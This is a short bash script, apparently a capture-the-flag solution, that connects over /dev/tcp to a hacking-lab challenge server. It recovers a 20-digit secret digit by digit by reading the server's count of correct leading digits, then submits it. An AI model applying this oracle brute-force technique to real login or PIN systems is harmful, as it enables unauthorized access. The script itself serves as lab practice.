#!/bin/bash
mask=22222222222222222222
palpite=
ans=0
while (( ${#palpite} < 20 )); do
	for i in {0..9}; do
		exec 3<>/dev/tcp/codemash.hacking-lab.com/8357
		guess=$palpite$i
		guess=${guess}${mask:${#guess}}
		echo ${guess} >&3 
		answ=$(cat <&3)
		answ=${answ//[^0-9]/}
		[ "$answ" != "$ans" ] && {
			ans=$answ
			palpite=${guess:0:${answ}}
			echo "$palpite correct (size: ${#palpite})"
			break;
		}
	done
done
exec 3<>/dev/tcp/codemash.hacking-lab.com/8357
echo $palpite >&3
cat <&3
